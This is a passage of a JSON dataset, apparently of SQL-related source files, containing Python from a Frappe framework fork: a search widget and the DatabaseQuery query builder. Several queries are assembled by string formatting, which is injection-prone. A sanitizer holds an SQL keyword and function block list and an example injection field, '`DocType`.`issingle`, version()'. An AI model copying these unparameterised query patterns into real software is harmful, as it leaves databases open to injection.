searchfield:\n\t\tsanitize_searchfield(searchfield)\n\n\tif not searchfield:\n\t\tsearchfield = \"name\"\n\n\tstandard_queries = frappe.get_hooks().standard_queries or {}\n\n\tif query and query.split()[0].lower()!=\"select\":\n\t\t# by method\n\t\tfrappe.response[\"values\"] = frappe.call(query, doctype, txt,\n\t\t\tsearchfield, start, page_length, filters, as_dict=as_dict)\n\telif not query and doctype in standard_queries:\n\t\t# from standard queries\n\t\tsearch_widget(doctype, txt, standard_queries[doctype][0],\n\t\t\tsearchfield, start, page_length, filters)\n\telse:\n\t\tif query:\n\t\t\tfrappe.throw(_(\"This query style is discontinued\"))\n\t\t\t# custom query\n\t\t\t# frappe.response[\"values\"] = frappe.db.sql(scrub_custom_query(query, searchfield, txt))\n\t\telse:\n\t\t\tif isinstance(filters, dict):\n\t\t\t\tfilters_items = filters.items()\n\t\t\t\tfilters = []\n\t\t\t\tfor f in filters_items:\n\t\t\t\t\tif isinstance(f[1], (list, tuple)):\n\t\t\t\t\t\tfilters.append([doctype, f[0], f[1][0], f[1][1]])\n\t\t\t\t\telse:\n\t\t\t\t\t\tfilters.append([doctype, f[0], \"=\", f[1]])\n\n\t\t\tif filters==None:\n\t\t\t\tfilters = []\n\t\t\tor_filters = []\n\n\n\t\t\t# build from doctype\n\t\t\tif txt:\n\t\t\t\tsearch_fields = [\"name\"]\n\t\t\t\tif meta.title_field:\n\t\t\t\t\tsearch_fields.append(meta.title_field)\n\n\t\t\t\tif meta.search_fields:\n\t\t\t\t\tsearch_fields.extend(meta.get_search_fields())\n\n\t\t\t\tfor f in search_fields:\n\t\t\t\t\tfmeta = meta.get_field(f.strip())\n\t\t\t\t\tif f == \"name\" or (fmeta and fmeta.fieldtype in [\"Data\", \"Text\", \"Small Text\", \"Long Text\",\n\t\t\t\t\t\t\"Link\", \"Select\", \"Read Only\", \"Text Editor\"]):\n\t\t\t\t\t\t\tor_filters.append([doctype, f.strip(), \"like\", \"%{0}%\".format(txt)])\n\n\t\t\tif meta.get(\"fields\", {\"fieldname\":\"enabled\", \"fieldtype\":\"Check\"}):\n\t\t\t\tfilters.append([doctype, \"enabled\", \"=\", 1])\n\t\t\tif meta.get(\"fields\", {\"fieldname\":\"disabled\", \"fieldtype\":\"Check\"}):\n\t\t\t\tfilters.append([doctype, \"disabled\", \"!=\", 1])\n\n\t\t\t# format a list of fields combining search fields and filter fields\n\t\t\tfields = get_std_fields_list(meta, searchfield or \"name\")\n\t\t\tif filter_fields:\n\t\t\t\tfields = list(set(fields + json.loads(filter_fields)))\n\t\t\tformatted_fields = ['`tab%s`.`%s`' % (meta.name, f.strip()) for f in fields]\n\n\t\t\t# find relevance as location of search term from the beginning of string `name`. used for sorting results.\n\t\t\tformatted_fields.append(\"\"\"locate(\"{_txt}\", `tab{doctype}`.`name`) as `_relevance`\"\"\".format(\n\t\t\t\t_txt=frappe.db.escape((txt or \"\").replace(\"%\", \"\")), doctype=frappe.db.escape(doctype)))\n\n\n\t\t\t# In order_by, `idx` gets second priority, because it stores link count\n\t\t\tfrom frappe.model.db_query import get_order_by\n\t\t\torder_by_based_on_meta = get_order_by(doctype, meta)\n\t\t\torder_by = \"if(_relevance, _relevance, 99999), `tab{0}`.idx desc, {1}\".format(doctype, order_by_based_on_meta)\n\n\t\t\tvalues = frappe.get_list(doctype,\n\t\t\t\tfilters=filters, fields=formatted_fields,\n\t\t\t\tor_filters = or_filters, limit_start = start,\n\t\t\t\tlimit_page_length=page_length,\n\t\t\t\torder_by=order_by,\n\t\t\t\tignore_permissions = True if doctype == \"DocType\" else False, # for dynamic links\n\t\t\t\tas_list=not as_dict)\n\n\t\t\t# remove _relevance from results\n\t\t\tif as_dict:\n\t\t\t\tfor r in values:\n\t\t\t\t\tr.pop(\"_relevance\")\n\t\t\t\tfrappe.response[\"values\"] = values\n\t\t\telse:\n\t\t\t\tfrappe.response[\"values\"] = [r[:-1] for r in values]\n\ndef get_std_fields_list(meta, key):\n\t# get additional search fields\n\tsflist = meta.search_fields and meta.search_fields.split(\",\") or []\n\ttitle_field = [meta.title_field] if (meta.title_field and meta.title_field not in sflist) else []\n\tsflist = ['name'] + sflist + title_field\n\tif not key in sflist:\n\t\tsflist = sflist + [key]\n\n\treturn sflist\n\ndef build_for_autosuggest(res):\n\tresults = []\n\tfor r in res:\n\t\tout = {\"value\": r[0], \"description\": \", \".join(unique(cstr(d) for d in r if d)[1:])}\n\t\tresults.append(out)\n\treturn results\n\ndef scrub_custom_query(query, key, txt):\n\tif '%(key)s' in query:\n\t\tquery = query.replace('%(key)s', key)\n\tif '%s' in query:\n\t\tquery = query.replace('%s', ((txt or '') + '%'))\n\treturn query\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/omirajkar/bench_frappe/blob/acd190cf9ec5b351177c69d37f02468521e4ab6c",
        "file_path": "/frappe/model/db_query.py",
        "source": "# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors\n# MIT License. See license.txt\n\nfrom __future__ import unicode_literals\n\nfrom six import iteritems, string_types\n\n\"\"\"build query for doclistview and return results\"\"\"\n\nimport frappe, json, copy, re\nimport frappe.defaults\nimport frappe.share\nimport frappe.permissions\nfrom frappe.utils import flt, cint, getdate, get_datetime, get_time, make_filter_tuple, get_filter, add_to_date\nfrom frappe import _\nfrom frappe.model import optional_fields\nfrom frappe.model.utils.user_settings import get_user_settings, update_user_settings\nfrom datetime import datetime\n\nclass DatabaseQuery(object):\n\tdef __init__(self, doctype):\n\t\tself.doctype = doctype\n\t\tself.tables = []\n\t\tself.conditions = []\n\t\tself.or_conditions = []\n\t\tself.fields = None\n\t\tself.user = None\n\t\tself.ignore_ifnull = False\n\t\tself.flags = frappe._dict()\n\n\tdef execute(self, query=None, fields=None, filters=None, or_filters=None,\n\t\tdocstatus=None, group_by=None, order_by=None, limit_start=False,\n\t\tlimit_page_length=None, as_list=False, with_childnames=False, debug=False,\n\t\tignore_permissions=False, user=None, with_comment_count=False,\n\t\tjoin='left join', distinct=False, start=None, page_length=None, limit=None,\n\t\tignore_ifnull=False, save_user_settings=False, save_user_settings_fields=False,\n\t\tupdate=None, add_total_row=None, user_settings=None):\n\t\tif not ignore_permissions and not frappe.has_permission(self.doctype, \"read\", user=user):\n\t\t\tfrappe.flags.error_message = _('Insufficient Permission for {0}').format(frappe.bold(self.doctype))\n\t\t\traise frappe.PermissionError(self.doctype)\n\n\t\t# fitlers and fields swappable\n\t\t# its hard to remember what comes first\n\t\tif (isinstance(fields, dict)\n\t\t\tor (isinstance(fields, list) and fields and isinstance(fields[0], list))):\n\t\t\t# if fields is given as dict/list of list, its probably filters\n\t\t\tfilters, fields = fields, filters\n\n\t\telif fields and isinstance(filters, list) \\\n\t\t\tand len(filters) > 1 and isinstance(filters[0], string_types):\n\t\t\t# if `filters` is a list of strings, its probably fields\n\t\t\tfilters, fields = fields, filters\n\n\t\tif fields:\n\t\t\tself.fields = fields\n\t\telse:\n\t\t\tself.fields =  [\"`tab{0}`.`name`\".format(self.doctype)]\n\n\t\tif start: limit_start = start\n\t\tif page_length: limit_page_length = page_length\n\t\tif limit: limit_page_length = limit\n\n\t\tself.filters = filters or []\n\t\tself.or_filters = or_filters or []\n\t\tself.docstatus = docstatus or []\n\t\tself.group_by = group_by\n\t\tself.order_by = order_by\n\t\tself.limit_start = 0 if (limit_start is False) else cint(limit_start)\n\t\tself.limit_page_length = cint(limit_page_length) if limit_page_length else None\n\t\tself.with_childnames = with_childnames\n\t\tself.debug = debug\n\t\tself.join = join\n\t\tself.distinct = distinct\n\t\tself.as_list = as_list\n\t\tself.ignore_ifnull = ignore_ifnull\n\t\tself.flags.ignore_permissions = ignore_permissions\n\t\tself.user = user or frappe.session.user\n\t\tself.update = update\n\t\tself.user_settings_fields = copy.deepcopy(self.fields)\n\t\t#self.debug = True\n\n\t\tif user_settings:\n\t\t\tself.user_settings = json.loads(user_settings)\n\n\t\tif query:\n\t\t\tresult = self.run_custom_query(query)\n\t\telse:\n\t\t\tresult = self.build_and_run()\n\n\t\tif with_comment_count and not as_list and self.doctype:\n\t\t\tself.add_comment_count(result)\n\n\t\tif save_user_settings:\n\t\t\tself.save_user_settings_fields = save_user_settings_fields\n\t\t\tself.update_user_settings()\n\n\t\treturn result\n\n\tdef build_and_run(self):\n\t\targs = self.prepare_args()\n\t\targs.limit = self.add_limit()\n\n\t\tif args.conditions:\n\t\t\targs.conditions = \"where \" + args.conditions\n\n\t\tif self.distinct:\n\t\t\targs.fields = 'distinct ' + args.fields\n\n\t\tquery = \"\"\"select %(fields)s from %(tables)s %(conditions)s\n\t\t\t%(group_by)s %(order_by)s %(limit)s\"\"\" % args\n\n\t\treturn frappe.db.sql(query, as_dict=not self.as_list, debug=self.debug, update=self.update)\n\n\tdef prepare_args(self):\n\t\tself.parse_args()\n\t\tself.sanitize_fields()\n\t\tself.extract_tables()\n\t\tself.set_optional_columns()\n\t\tself.build_conditions()\n\n\t\targs = frappe._dict()\n\n\t\tif self.with_childnames:\n\t\t\tfor t in self.tables:\n\t\t\t\tif t != \"`tab\" + self.doctype + \"`\":\n\t\t\t\t\tself.fields.append(t + \".name as '%s:name'\" % t[4:-1])\n\n\t\t# query dict\n\t\targs.tables = self.tables[0]\n\n\t\t# left join parent, child tables\n\t\tfor child in self.tables[1:]:\n\t\t\targs.tables += \" {join} {child} on ({child}.parent = {main}.name)\".format(join=self.join,\n\t\t\t\tchild=child, main=self.tables[0])\n\n\t\tif self.grouped_or_conditions:\n\t\t\tself.conditions.append(\"({0})\".format(\" or \".join(self.grouped_or_conditions)))\n\n\t\targs.conditions = ' and '.join(self.conditions)\n\n\t\tif self.or_conditions:\n\t\t\targs.conditions += (' or ' if args.conditions else \"\") + \\\n\t\t\t\t' or '.join(self.or_conditions)\n\n\t\tself.set_field_tables()\n\n\t\targs.fields = ', '.join(self.fields)\n\n\t\tself.set_order_by(args)\n\n\t\tself.validate_order_by_and_group_by(args.order_by)\n\t\targs.order_by = args.order_by and (\" order by \" + args.order_by) or \"\"\n\n\t\tself.validate_order_by_and_group_by(self.group_by)\n\t\targs.group_by = self.group_by and (\" group by \" + self.group_by) or \"\"\n\n\t\treturn args\n\n\tdef parse_args(self):\n\t\t\"\"\"Convert fields and filters from strings to list, dicts\"\"\"\n\t\tif isinstance(self.fields, string_types):\n\t\t\tif self.fields == \"*\":\n\t\t\t\tself.fields = [\"*\"]\n\t\t\telse:\n\t\t\t\ttry:\n\t\t\t\t\tself.fields = json.loads(self.fields)\n\t\t\t\texcept ValueError:\n\t\t\t\t\tself.fields = [f.strip() for f in self.fields.split(\",\")]\n\n\t\tfor filter_name in [\"filters\", \"or_filters\"]:\n\t\t\tfilters = getattr(self, filter_name)\n\t\t\tif isinstance(filters, string_types):\n\t\t\t\tfilters = json.loads(filters)\n\n\t\t\tif isinstance(filters, dict):\n\t\t\t\tfdict = filters\n\t\t\t\tfilters = []\n\t\t\t\tfor key, value in iteritems(fdict):\n\t\t\t\t\tfilters.append(make_filter_tuple(self.doctype, key, value))\n\t\t\tsetattr(self, filter_name, filters)\n\n\tdef sanitize_fields(self):\n\t\t'''\n\t\t\tregex : ^.*[,();].*\n\t\t\tpurpose : The regex will look for malicious patterns like `,`, '(', ')', ';' in each\n\t\t\t\t\tfield which may leads to sql injection.\n\t\t\texample :\n\t\t\t\tfield = \"`DocType`.`issingle`, version()\"\n\n\t\t\tAs field contains `,` and mysql function `version()`, with the help of regex\n\t\t\tthe system will filter out this field.\n\t\t'''\n\n\t\tsub_query_regex = re.compile(\"^.*[,();].*\")\n\t\tblacklisted_keywords = ['select', 'create', 'insert', 'delete', 'drop', 'update', 'case']\n\t\tblacklisted_functions = ['concat', 'concat_ws', 'if', 'ifnull', 'nullif', 'coalesce',\n\t\t\t'connection_id', 'current_user', 'database', 'last_insert_id', 'session_user',\n\t\t\t'system_user', 'user', 'version']\n\n\t\tdef _raise_exception():\n\t\t\tfrappe.throw(_('Cannot use sub-query or function in fields'), frappe.DataError)\n\n\t\tfor field in self.fields:\n\t\t\tif sub_query_regex.match(field):\n\t\t\t\tif any(keyword in field.lower().split() for keyword in blacklisted_keywords):\n\t\t\t\t\t_raise_exception()\n\n\t\t\t\tif any(\"({0}\".format(keyword) in field.lower() for keyword in blacklisted_keywords):\n\t\t\t\t\t_raise_exception()\n\n\t\t\t\tif any(\"{0}(\".format(keyword) in field.lower() for keyword in blacklisted_functions):\n\t\t\t\t\t_raise_exception()\n\n\t\t\tif re.compile(\"[a-zA-Z]+\\s*'\").match(field):\n\t\t\t\t_raise_exception()\n\n\t\t\tif re.compile('[a-zA-Z]+\\s*,').match(field):\n\t\t\t\t_raise_exception()\n\n\tdef extract_tables(self):\n\t\t\"\"\"extract tables from fields\"\"\"\n\t\tself.tables = ['`tab' + self.doctype + '`']\n\n\t\t# add tables from fields\n\t\tif self.fields:\n\t\t\tfor f in self.fields:\n\t\t\t\tif ( not (\"tab\" in f and \".\" in f) ) or (\"locate(\" in f) or (\"count(\" in f):\n\t\t\t\t\tcontinue\n\n\t\t\t\ttable_name = f.split('.')[0]\n\t\t\t\tif table_name.lower().startswith('group_concat('):\n\t\t\t\t\ttable_name = table_name[13:]\n\t\t\t\tif table_name.lower().startswith('ifnull('):\n\t\t\t\t\ttable_name = table_name[7:]\n\t\t\t\tif not table_name[0]=='`':\n\t\t\t\t\ttable_name = '`' + table_name + '`'\n\t\t\t\tif not table_name in self.tables:\n\t\t\t\t\tself.append_table(table_name)\n\n\tdef append_table(self, table_name):\n\t\tself.tables.append(table_name)\n\t\tdoctype = table_name[4:-1]\n\t\tif (not self.flags.ignore_permissions) and (not frappe.has_permission(doctype)):\n\t\t\tfrappe.flags.error_message = _('Insufficient Permission for {0}').format(frappe.bold(doctype))\n\t\t\traise frappe.PermissionError(doctype)\n\n\tdef set_field_tables(self):\n\t\t'''If there are more than one table, the fieldname must not be ambigous.\n\t\tIf the fieldname is not explicitly mentioned, set the default table'''\n\t\tif len(self.tables) > 1:\n\t\t\tfor i, f in enumerate(self.fields):\n\t\t\t\tif '.' not in f:\n\t\t\t\t\tself.fields[i] = '{0}.{1}'.format(self.tables[0], f)\n\n\tdef set_optional_columns(self):\n\t\t\"\"\"Removes optional columns like `_user_tags`, `_comments` etc. if not in table\"\"\"\n\t\tcolumns = frappe.db.get_table_columns(self.doctype)\n\n\t\t# remove from fields\n\t\tto_remove = []\n\t\tfor fld in self.fields:\n\t\t\tfor f in optional_fields:\n\t\t\t\tif f in fld and not f in columns:\n\t\t\t\t\tto_remove.append(fld)\n\n\t\tfor fld in to_remove:\n\t\t\tdel self.fields[self.fields.index(fld)]\n\n\t\t# remove from filters\n\t\tto_remove = []\n\t\tfor each in self.filters:\n\t\t\tif isinstance(each, string_types):\n\t\t\t\teach = [each]\n\n\t\t\tfor element in each:\n\t\t\t\tif element in optional_fields and element not in columns:\n\t\t\t\t\tto_remove.append(each)\n\n\t\tfor each in to_remove:\n\t\t\tif isinstance(self.filters, dict):\n\t\t\t\tdel self.filters[each]\n\t\t\telse:\n\t\t\t\tself.filters.remove(each)\n\n\tdef build_conditions(self):\n\t\tself.conditions = []\n\t\tself.grouped_or_conditions = []\n\t\tself.build_filter_conditions(self.filters, self.conditions)\n\t\tself.build_filter_conditions(self.or_filters, self.grouped_or_conditions)\n\n\t\t# match conditions\n\t\tif not self.flags.ignore_permissions:\n\t\t\tmatch_conditions = self.build_match_conditions()\n\t\t\tif match_conditions:\n\t\t\t\tself.conditions.append(\"(\" + match_conditions + \")\")\n\n\tdef build_filter_conditions(self, filters, conditions, ignore_permissions=None):\n\t\t\"\"\"build conditions from user filters\"\"\"\n\t\tif ignore_permissions is not None:\n\t\t\tself.flags.ignore_permissions = ignore_permissions\n\n\t\tif isinstance(filters, dict):\n\t\t\tfilters = [filters]\n\n\t\tfor f in filters:\n\t\t\tif isinstance(f, string_types):\n\t\t\t\tconditions.append(f)\n\t\t\telse:\n\t\t\t\tconditions.append(self.prepare_filter_condition(f))\n\n\tdef prepare_filter_condition(self, f):\n\t\t\"\"\"Returns a filter condition in the format:\n\n\t\t\t\tifnull(`tabDocType`.`fieldname`, fallback) operator \"value\"\n\t\t\"\"\"\n\n\t\tf = get_filter(self.doctype, f)\n\n\t\ttname = ('`tab' + f.doctype + '`')\n\t\tif not tname in self.tables:\n\t\t\tself.append_table(tname)\n\n\t\tif 'ifnull(' in f.fieldname:\n\t\t\tcolumn_name = f.fieldname\n\t\telse:\n\t\t\tcolumn_name = '{tname}.{fname}'.format(tname=tname,\n\t\t\t\tfname=f.fieldname)\n\n\t\tcan_be_null = True\n\n\t\t# prepare in condition\n\t\tif f.operator.lower() in ('in', 'not in'):\n\t\t\tvalues = f.value or ''\n\t\t\tif not isinstance(values, (list, tuple)):\n\t\t\t\tvalues = values.split(\",\")\n\n\t\t\tfallback = \"''\"\n\t\t\tvalue = (frappe.db.escape((v or '').strip(), percent=False) for v in values)\n\t\t\tvalue = '(\"{0}\")'.format('\", \"'.join(value))\n\t\telse:\n\t\t\tdf = frappe.get_meta(f.doctype).get(\"fields\", {\"fieldname\": f.fieldname})\n\t\t\tdf = df[0] if df else None\n\n\t\t\tif df and df.fieldtype in (\"Check\", \"Float\", \"Int\", \"Currency\", \"Percent\"):\n\t\t\t\tcan_be_null = False\n\n\t\t\tif f.operator.lower() == 'between' and \\\n\t\t\t\t(f.fieldname in ('creation', 'modified') or (df and (df.fieldtype==\"Date\" or df.fieldtype==\"Datetime\"))):\n\n\t\t\t\tvalue = get_between_date_filter(f.value, df)\n\t\t\t\tfallback = \"'0000-00-00 00:00:00'\"\n\n\t\t\telif df and df.fieldtype==\"Date\":\n\t\t\t\tvalue = getdate(f.value).strftime(\"%Y-%m-%d\")\n\t\t\t\tfallback = \"'0000-00-00'\"\n\n\t\t\telif (df and df.fieldtype==\"Datetime\") or isinstance(f.value, datetime):\n\t\t\t\tvalue = get_datetime(f.value).strftime(\"%Y-%m-%d %H:%M:%S.%f\")\n\t\t\t\tfallback = \"'0000-00-00 00:00:00'\"\n\n\t\t\telif df and df.fieldtype==\"Time\":\n\t\t\t\tvalue = get_time(f.value).strftime(\"%H:%M:%S.%f\")\n\t\t\t\tfallback = \"'00:00:00'\"\n\n\t\t\telif f.operator.lower() in (\"like\", \"not like\") or (isinstance(f.value, string_types) and\n\t\t\t\t(not df or df.fieldtype not in [\"Float\", \"Int\", \"Currency\", \"Percent\", \"Check\"])):\n\t\t\t\t\tvalue = \"\" if f.value==None else f.value\n\t\t\t\t\tfallback = '\"\"'\n\n\t\t\t\t\tif f.operator.lower() in (\"like\", \"not like\") and isinstance(value, string_types):\n\t\t\t\t\t\t# because \"like\" uses backslash (\\) for escaping\n\t\t\t\t\t\tvalue = value.replace(\"\\\\\", \"\\\\\\\\\").replace(\"%\", \"%%\")\n\n\t\t\telse:\n\t\t\t\tvalue = flt(f.value)\n\t\t\t\tfallback = 0\n\n\t\t\t# put it inside double quotes\n\t\t\tif isinstance(value, string_types) and not f.operator.lower() == 'between':\n\t\t\t\tvalue = '\"{0}\"'.format(frappe.db.escape(value, percent=False))\n\n\t\tif (self.ignore_ifnull\n\t\t\tor not can_be_null\n\t\t\tor (f.value and f.operator.lower() in ('=', 'like'))\n\t\t\tor 'ifnull(' in column_name.lower()):\n\t\t\tcondition = '{column_name} {operator} {value}'.format(\n\t\t\t\tcolumn_name=column_name, operator=f.operator,\n\t\t\t\tvalue=value)\n\t\telse:\n\t\t\tcondition = 'ifnull({column_name}, {fallback}) {operator} {value}'.format(\n\t\t\t\tcolumn_name=column_name, fallback=fallback, operator=f.operator,\n\t\t\t\tvalue=value)\n\n\t\treturn condition\n\n\tdef build_match_conditions(self, as_condition=True):\n\t\t\"\"\"add match conditions if applicable\"\"\"\n\t\tself.match_filters = []\n\t\tself.match_conditions = []\n\t\tonly_if_shared = False\n\t\tif not self.user:\n\t\t\tself.user = frappe.session.user\n\n\t\tif not self.tables: self.extract_tables()\n\n\t\tmeta = frappe.get_meta(self.doctype)\n\t\trole_permissions = frappe.permissions.get_role_permissions(meta, user=self.user)\n\n\t\tself.shared = frappe.share.get_shared(self.doctype, self.user)\n\n\t\tif not meta.istable and not role_permissions.get(\"read\") and not self.flags.ignore_permissions:\n\t\t\tonly_if_shared = True\n\t\t\tif not self.shared:\n\t\t\t\tfrappe.throw(_(\"No permission to read {0}\").format(self.doctype), frappe.PermissionError)\n\t\t\telse:\n\t\t\t\tself.conditions.append(self.get_share_condition())\n\n\t\telse:\n\t\t\t# apply user permissions?\n\t\t\tif role_permissions.get(\"apply_user_permissions\", {}).get(\"read\"):\n\t\t\t\t# get user permissions\n\t\t\t\tuser_permissions = frappe.permissions.get_user_permissions(self.user)\n\t\t\t\tself.add_user_permissions(user_permissions,\n\t\t\t\t\tuser_permission_doctypes=role_permissions.get(\"user_permission_doctypes\").get(\"read\"))\n\n\t\t\tif role_permissions.get(\"if_owner\", {}).get(\"read\"):\n\t\t\t\tself.match_conditions.append(\"`tab{0}`.owner = '{1}'\".format(self.doctype,\n\t\t\t\t\tfrappe.db.escape(self.user, percent=False)))\n\n\t\tif as_condition:\n\t\t\tconditions = \"\"\n\t\t\tif self.match_conditions:\n\t\t\t\t# will turn out like ((blog_post in (..) and blogger in (...)) or (blog_category in (...)))\n\t\t\t\tconditions = \"((\" + \") or (\".join(self.match_conditions) + \"))\"\n\n\t\t\tdoctype_conditions = self.get_permission_query_conditions()\n\t\t\tif doctype_conditions:\n\t\t\t\tconditions += (' and ' + doctype_conditions) if conditions else doctype_conditions\n\n\t\t\t# share is an OR condition, if there is a role permission\n\t\t\tif not only_if_shared and self.shared and conditions:\n\t\t\t\tconditions =  \"({conditions}) or ({shared_condition})\".format(\n\t\t\t\t\tconditions=conditions, shared_condition=self.get_share_condition())\n\n\t\t\treturn conditions\n\n\t\telse:\n\t\t\treturn self.match_filters\n\n\tdef get_share_condition(self):\n\t\treturn \"\"\"`tab{0}`.name in ({1})\"\"\".format(self.doctype, \", \".join([\"'%s'\"] * len(self.shared))) % \\\n\t\t\ttuple([frappe.db.escape(s, percent=False) for s in self.shared])\n\n\tdef add_user_permissions(self, user_permissions, user_permission_doctypes=None):\n\t\tuser_permission_doctypes = frappe.permissions.get_user_permission_doctypes(user_permission_doctypes, user_permissions)\n\t\tmeta = frappe.get_meta(self.doctype)\n\t\tfor doctypes in user_permission_doctypes:\n\t\t\tmatch_filters = {}\n\t\t\tmatch_conditions = []\n\t\t\t# check in links\n\t\t\tfor df in meta.get_fields_to_check_permissions(doctypes):\n\t\t\t\tuser_permission_values = user_permissions.get(df.options, [])\n\n\t\t\t\tcond = 'ifnull(`tab{doctype}`.`{fieldname}`, \"\")=\"\"'.format(doctype=self.doctype, fieldname=df.fieldname)\n\t\t\t\tif user_permission_values:\n\t\t\t\t\tif not cint(frappe.get_system_settings(\"apply_strict_user_permissions\")):\n\t\t\t\t\t\tcondition = cond + \" or \"\n\t\t\t\t\telse:\n\t\t\t\t\t\tcondition = \"\"\n\t\t\t\t\tcondition += \"\"\"`tab{doctype}`.`{fieldname}` in ({values})\"\"\".format(\n\t\t\t\t\t\tdoctype=self.doctype, fieldname=df.fieldname,\n\t\t\t\t\t\tvalues=\", \".join([('\"'+frappe.db.escape(v, percent=False)+'\"') for v in user_permission_values]))\n\t\t\t\telse:\n\t\t\t\t\tcondition = cond\n\n\t\t\t\tmatch_conditions.append(\"({condition})\".format(condition=condition))\n\n\t\t\t\tmatch_filters[df.options] = user_permission_values\n\n\t\t\tif match_conditions:\n\t\t\t\tself.match_conditions.append(\" and \".join(match_conditions))\n\n\t\t\tif match_filters:\n\t\t\t\tself.match_filters.append(match_filters)\n\n\tdef get_permission_query_conditions(self):\n\t\tcondition_methods = frappe.get_hooks(\"permission_query_conditions\", {}).get(self.doctype, [])\n\t\tif condition_methods:\n\t\t\tconditions = []\n\t\t\tfor method in condition_methods:\n\t\t\t\tc = frappe.call(frappe.get_attr(method), self.user)\n\t\t\t\tif c:\n\t\t\t\t\tconditions.append(c)\n\n\t\t\treturn \" and \".join(conditions) if conditions else None\n\n\tdef run_custom_query(self, query):\n\t\tif '%(key)s' in query:\n\t\t\tquery = query.replace('%(key)s', 'name')\n\t\treturn frappe.db.sql(query, as_dict = (not self.as_list))\n\n\tdef set_order_by(self, args):\n\t\tmeta = frappe.get_meta(self.doctype)\n\n\t\tif self.order_by:\n\t\t\targs.order_by = self.order_by\n\t\telse:\n\t\t\targs.order_by = \"\"\n\n\t\t\t# don't add order by from meta if a mysql group function is used without group by clause\n\t\t\tgroup_function_without_group_by = (len(self.fields)==1 and\n\t\t\t\t(\tself.fields[0].lower().startswith(\"count(\")\n\t\t\t\t\tor self.fields[0].lower().startswith(\"min(\")\n\t\t\t\t\tor self.fields[0].lower().startswith(\"max(\")\n\t\t\t\t) and not self.group_by)\n\n\t\t\tif not group_function_without_group_by:\n\t\t\t\tsort_field = sort_order = None\n\t\t\t\tif meta.sort_field and ',' in meta.sort_field:\n\t\t\t\t\t# multiple sort given in doctype definition\n\t\t\t\t\t# Example:\n\t\t\t\t\t# `idx desc, modified desc`\n\t\t\t\t\t# will covert to\n\t\t\t\t\t# `tabItem`.`idx` desc, `tabItem`.`modified` desc\n\t\t\t\t\targs.order_by = ', '.join(['`tab{0}`.`{1}` {2}'.format(self.doctype,\n\t\t\t\t\t\tf.split()[0].strip(), f.split()[1].strip()) for f in meta.sort_field.split(',')])\n\t\t\t\telse:\n\t\t\t\t\tsort_field = meta.sort_field or 'modified'\n\t\t\t\t\tsort_order = (meta.sort_field and meta.sort_order) or 'desc'\n\n\t\t\t\t\targs.order_by = \"`tab{0}`.`{1}` {2}\".format(self.doctype, sort_field or \"modified\", sort_order or \"desc\")\n\n\t\t\t\t# draft docs always on top\n\t\t\t\tif meta.is_submittable:\n\t\t\t\t\targs.order_by = \"`tab{0}`.docstatus asc, {1}\".format(self.doctype, args.order_by)\n\n\tdef validate_order_by_and_group_by(self, parameters):\n\t\t\"\"\"Check order by, group by so that atleast one column is selected and does not have subquery\"\"\"\n\t\tif not parameters:\n\t\t\treturn\n\n\t\t_lower = parameters.lower()\n\t\tif 'select' in _lower and ' from ' in _lower:\n\t\t\tfrappe.throw(_('Cannot use sub-query in order by'))\n\n\n\t\tfor field in parameters.split(\",\"):\n\t\t\tif \".\" in field and field.strip().startswith(\"`tab\"):\n\t\t\t\ttbl = field.strip().split('.')[0]\n\t\t\t\tif tbl not in self.tables:\n\t\t\t\t\tif tbl.startswith('`'):\n\t\t\t\t\t\ttbl = tbl[4:-1]\n\t\t\t\t\tfrappe.throw(_(\"Please select atleast 1 column from {0} to sort/group\").format(tbl))\n\n\tdef add_limit(self):\n\t\tif self.limit_page_length:\n\t\t\treturn 'limit %s, %s' % (self.limit_start, self.limit_page_length)\n\t\telse:\n\t\t\treturn ''\n\n\tdef add_comment_count(self, result):\n\t\tfor r in result:\n\t\t\tif not r.name:\n\t\t\t\tcontinue\n\n\t\t\tr._comment_count = 0\n\t\t\tif \"_comments\" in r:\n\t\t\t\tr._comment_count = len(json.loads(r._comments or \"[]\"))\n\n\tdef update_user_settings(self):\n\t\t# update user settings if new search\n\t\tuser_settings = json.loads(get_user_settings(self.doctype))\n\n\t\tif hasattr(self, 'user_settings'):\n\t\t\tuser_settings.update(self.user_settings)\n\n\t\tif self.save_user_settings_fields:\n\t\t\tuser_settings['fields'] = self.user_settings_fields\n\n\t\tupdate_user_settings(self.doctype, user_settings)\n\ndef get_order_by(doctype, meta):\n\torder_by = \"\"\n\n\tsort_field = sort_order = None\n\tif meta.sort_field and ',' in meta.sort_field:\n\t\t# multiple sort given in doctype definition\n\t\t# Example:\n\t\t# `idx desc, modified desc`\n\t\t# will covert to\n\t\t# `tabItem`.`idx` desc, `tabItem`.`modified` desc\n\t\torder_by = ', '.join(['`tab{0}`.`{1}` {2}'.format(doctype,\n\t\t\tf.split()[0].strip(), f.split()[1].strip()) for f in meta.sort_field.split(',')])\n\telse:\n\t\tsort_field = meta.sort_field or 'modified'\n\t\tsort_order = (meta.sort_field and meta.sort_order) or 'desc'\n\n\t\torder_by = \"`tab{0}`.`{1}` {2}\".format(doctype, sort_field or \"modified\", sort_order or \"desc\")\n\n\t# draft docs always on top\n\tif meta.is_submittable:\n\t\torder_by = \"`tab{0}`.docstatus asc, {1}\".format(doctype, order_by)\n\n\treturn order_by\n\n\n@frappe.whitelist()\ndef get_list(doctype, *args, **kwargs):\n\t'''wrapper for DatabaseQuery'''\n\tkwargs.pop('cmd', None)\n\treturn DatabaseQuery(doctype).execute(None, *args, **kwargs)\n\ndef is_parent_only_filter(doctype, filters):\n\t#check if filters contains only parent doctype\n\tonly_parent_doctype = True\n\n\tif isinstance(filters, list):\n\t\tfor flt in filters:\n\t\t\tif doctype not in flt:\n\t\t\t\tonly_parent_doctype = False\n\t\t\tif 'Between' in flt:\n\t\t\t\tflt[3] = get_between_date_filter(flt[3])\n\n\treturn only_parent_doctype\n\ndef get_between_date_filter(value, df=None):\n\t'''\n\t\treturn the formattted date as per the given example\n\t\t[u'2017-11-01', u'2017-11-03'] => '2017-11-01 00:00:00.000000' AND '2017-11-04 00:00:00.000000'\n\t'''\n\tfrom_date = None\n\tto_date = None\n\tdate_format = \"%Y-%m-%d %H:%M:%S.%f\"\n\n\tif df:\n\t\tdate_format = \"%Y-%m-%d %H:%M:%S.%f\" if df.fieldtype == 'Datetime' else \"%Y-%m-%d\"\n\n\tif value and isinstance(value, (list, tuple)):\n\t\tif len(value) >= 1: from_date = value[0]\n\t\tif len(value) >= 2: to_date = value[1]\n\n\tif not df or (df and df.fieldtype == 'Datetime'):\n\t\tto_date = add_to_date(to_date,days=1)\n\n\tdata = 